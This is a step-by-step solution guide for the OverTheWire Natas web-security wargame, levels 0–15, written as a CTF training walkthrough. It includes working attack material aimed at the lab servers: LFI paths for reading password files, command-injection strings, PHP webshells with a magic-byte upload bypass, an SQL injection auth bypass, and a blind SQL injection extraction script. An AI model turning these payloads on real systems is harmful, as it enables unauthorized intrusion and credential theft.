# 🛡️ OverTheWire: Natas Wargame Walkthrough (Levels 0–15)

A detailed, step-by-step walkthrough and solution guide for **OverTheWire Natas** (Levels 0 to 15). This repository documents client-side bypasses, HTTP header manipulation, PHP code auditing, Local File Inclusion (LFI), Command Injection, and SQL Injection.

---

## 📚 Table of Contents
- [Level 0 → Level 1](#level-0--level-1)
- [Level 1 → Level 2](#level-1--level-2)
- [Level 2 → Level 3](#level-2--level-3)
- [Level 3 → Level 4](#level-3--level-4)
- [Level 4 → Level 5](#level-4--level-5)
- [Level 5 → Level 6](#level-5--level-6)
- [Level 6 → Level 7](#level-6--level-7)
- [Level 7 → Level 8](#level-7--level-8)
- [Level 8 → Level 9](#level-8--level-9)
- [Level 9 → Level 10](#level-9--level-10)
- [Level 10 → Level 11](#level-10--level-11)
- [Level 11 → Level 12](#level-11--level-12)
- [Level 12 → Level 13](#level-12--level-13)
- [Level 13 → Level 14](#level-13--level-14)
- [Level 14 → Level 15](#level-14--level-15)
- [Level 15 → Level 16 (Automation Script)](#level-15--level-16)

---

## Level 0 → Level 1
* **Vulnerability:** Unprotected HTML Source Comment
* **Concept:** Developers often leave passwords or sensitive information in source comments.
* **Steps:**
  1. Open `http://natas0.natas.labs.overthewire.org/`.
  2. Right-click the page and select **View Page Source** (or press `CTRL + U`).
  3. Look for the HTML comment `<!-- The password for natas1 is ... -->`.

---

## Level 1 → Level 2
* **Vulnerability:** Client-side Protection Bypass (Disabled Right-Click)
* **Concept:** Frontend JavaScript restrictions do not prevent users from viewing the underlying HTTP response or source code.
* **Steps:**
  1. Open `http://natas1.natas.labs.overthewire.org/`.
  2. Right-click is blocked on the page. Bypass this by pressing `CTRL + U` or prefixing the URL with `view-source:`.
  3. Find the password inside the HTML source comment.

---

## Level 2 → Level 3
* **Vulnerability:** Unquoted Asset Directory / Directory Listing
* **Concept:** Web servers configured with directory listing enabled allow users to browse unlinked files.
* **Steps:**
  1. Open the source code of Natas 2 and find the image link: `<img src="files/pixel.png">`.
  2. Navigate directly to the directory path in your browser: `http://natas2.natas.labs.overthewire.org/files/`.
  3. Click on `users.txt` to read the stored passwords.

---

## Level 3 → Level 4
* **Vulnerability:** Information Disclosure via `robots.txt`
* **Concept:** Search engine crawlers use `robots.txt` to identify hidden directories, which attackers can also inspect.
* **Steps:**
  1. Inspect the source code hint: `"Not even Google can find it"`.
  2. Visit `http://natas3.natas.labs.overthewire.org/robots.txt`.
  3. Locate the entry: `Disallow: /s3cr3t/`.
  4. Navigate to `http://natas3.natas.labs.overthewire.org/s3cr3t/` and open `users.txt`.

---

## Level 4 → Level 5
* **Vulnerability:** Insecure Referer Header Validation
* **Concept:** Web applications relying on client-supplied HTTP headers for access control can be tricked using header spoofing.
* **Steps:**
  1. The page states: *"Authorized users should come from natas5"*.
  2. Intercept the request using Burp Suite or use `curl`:
     ```bash
     curl -s -u natas4:<NATAS4_PASSWORD> -H "Referer: [http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)" [http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)
     ```
  3. Read the password returned in the response.

---

## Level 5 → Level 6
* **Vulnerability:** Insecure Cookie-Based Session State
* **Concept:** Client-side cookies storing plain boolean flags (e.g., `loggedin=0`) can be tampered with directly.
* **Steps:**
  1. Open Browser DevTools (`F12`) → **Application** / **Storage** → **Cookies**.
  2. Locate the cookie named `loggedin` with value `0`.
  3. Modify the value to `1` and refresh the page.

---

## Level 6 → Level 7
* **Vulnerability:** Hardcoded Secret Disclosure in Included Files
* **Concept:** Inspecting PHP backend includes referenced in public source code.
* **Steps:**
  1. Click **"View source code"**.
  2. Notice the line: `include "includes/secret.inc";`.
  3. Navigate directly to `http://natas6.natas.labs.overthewire.org/includes/secret.inc`.
  4. View the page source to retrieve the secret key, paste it into the form submit field, and get the password.

---

## Level 7 → Level 8
* **Vulnerability:** Local File Inclusion (LFI) / Directory Traversal
* **Concept:** Supplying an absolute or relative system path to an unsanitized file-viewing parameter allows arbitrary file reads.
* **Steps:**
  1. Observe the URL parameter: `index.php?page=home`.
  2. Overwrite the parameter value to point to the Natas password file location (`/etc/natas_webpass/natas8`):
     ```text
     [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
     ```

---

## Level 8 → Level 9
* **Vulnerability:** Reversible Insecure Encoding Algorithm
* **Concept:** Encoding mechanisms (Base64, Hex, Reversing) are not encryption and can be decoded deterministically.
* **Steps:**
  1. View the source code to see how the secret is processed:
     `bin2hex(strrev(base64_encode($secret)))`
  2. Take the target encoded string given in the code and reverse the operations in Python or PHP:
     * Hex Decode → Reverse String → Base64 Decode
  3. **Python Solution:**
     ```python
     import base64
     encoded = "3d3d516343743d3d4d79763163785732373d3d2731"
     secret = base64.b64decode(bytes.fromhex(encoded)[::-1]).decode()
     print("Secret:", secret)
     ```
  4. Submit the decoded secret to get the password.

---

## Level 9 → Level 10
* **Vulnerability:** Unsanitized Command Injection
* **Concept:** Passing user input directly into system execution functions (like `passthru` or `exec`) enables arbitrary command execution.
* **Steps:**
  1. Source code passes input into `passthru("grep -i $key dictionary.txt")`.
  2. Inject a wildcard matching string followed by the system target file path:
     ```text
     .* /etc/natas_webpass/natas10
     ```
  3. The resulting command executed on the server becomes:
     `grep -i .* /etc/natas_webpass/natas10 dictionary.txt`

---

## Level 10 → Level 11
* **Vulnerability:** Filtered Command Injection Bypass
* **Concept:** When special characters like `;`, `&`, or `|` are blacklisted, alternative command options or regex patterns can bypass restrictions.
* **Steps:**
  1. The code filters out `[;&|]`.
  2. Use `grep` search syntax to target the password file directly without using command chaining operators:
     ```text
     .* /etc/natas_webpass/natas11
     ```

---

## Level 11 → Level 12
* **Vulnerability:** XOR Cipher Key Disclosure & Cookie Manipulation
* **Concept:** Knowing the Plaintext ($P$) and Ciphertext ($C$) allows calculating the XOR Key ($K$) using the property: $K = P \oplus C$.
* **Steps:**
  1. Inspect default PHP data array: `array("showpassword"=>"no", "bgcolor"=>"#ffffff")`.
  2. Extract the `data` cookie from HTTP request.
  3. Run the XOR decryption script (see `scripts/natas11_solver.php`) to find the repeating XOR key `qw8J`.
  4. Modify the array data to `"showpassword"=>"yes"`, encrypt it with key `qw8J`, and replace your browser cookie.

---

## Level 12 → Level 13
* **Vulnerability:** Unrestricted File Upload (Extension Tampering)
* **Concept:** Changing hidden client-side form parameters allows uploading executable `.php` webshell files instead of images.
* **Steps:**
  1. Create a PHP webshell file named `shell.php`:
     ```php
     <?php system('cat /etc/natas_webpass/natas13'); ?>
     ```
  2. Change the hidden HTML form parameter `filename` from `xxxx.jpg` to `shell.php`.
  3. Upload the file, navigate to the returned file path, and read the executed output.

---

## Level 13 → Level 14
* **Vulnerability:** File Upload Bypass via Magic Bytes
* **Concept:** Web applications checking file types using `exif_imagetype()` can be bypassed by prepending valid image headers (Magic Bytes) to a script payload.
* **Steps:**
  1. Add JPEG Magic Bytes (`\xFF\xD8\xFF\xE0`) or GIF signature (`GIF89a;`) to the top of your PHP webshell:
     ```php
     GIF89a;
     <?php system('cat /etc/natas_webpass/natas14'); ?>
     ```
  2. Save as `shell.php`, bypass extension check, upload, and access the uploaded path.

---

## Level 14 → Level 15
* **Vulnerability:** SQL Injection (Authentication Bypass)
* **Concept:** Unescaped input in SQL queries allows altering logic via standard Boolean manipulation (`OR 1=1`).
* **Steps:**
  1. Source code query: `SELECT * from users WHERE username="$user" AND password="$pass"`.
  2. Inject payload into the `username` field:
     ```sql
     natas15" OR 1=1 -- 
     ```
  3. Submit to bypass authentication and retrieve the password for Level 15.

---

## Level 15 → Level 16
* **Vulnerability:** Blind SQL Injection (Boolean-Based)
* **Concept:** When application responses only confirm if a query returned `True` or `False`, data can be extracted character-by-character using SQL wildcard matches (`LIKE BINARY`).
* **Automation Script (`scripts/natas15_solver.py`):**

```python
import requests
from requests.auth import HTTPBasicAuth
import string

url = "[http://natas15.natas.labs.overthewire.org/](http://natas15.natas.labs.overthewire.org/)"
auth = HTTPBasicAuth("natas15", "<INSERT_NATAS15_PASSWORD_HERE>")
charset = string.ascii_letters + string.digits
extracted_password = ""

print("[+] Starting Blind SQL Injection character extraction...")

for position in range(32):
    for char in charset:
        # Construct payload checking character position using binary match
        payload = f'natas16" AND password LIKE BINARY "{extracted_password + char}%'
        response = requests.post(url, auth=auth, data={"username": payload})
        
        if "This user exists" in response.text:
            extracted_password += char
            print(f"[+] Found character ({position + 1}/32): {extracted_password}")
            break

print(f"\n[✓] Extracted Natas 16 Password: {extracted_password}")
